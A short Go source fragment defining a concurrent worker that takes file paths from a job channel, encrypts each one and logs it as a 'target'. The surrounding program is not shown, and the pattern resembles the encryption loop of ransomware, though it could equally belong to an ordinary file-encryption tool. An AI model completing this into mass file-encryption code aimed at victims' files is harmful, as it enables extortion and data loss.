package main

import (
	"log"
	"sync"
)

func (e *Encryptor) NewWorker(wg *sync.WaitGroup) {
	defer wg.Done()
	for path := range e.JobChan {
		err := e.Encrypt(path)
		log.Printf("target: %s, status: %v\n", path, err)
	}
}
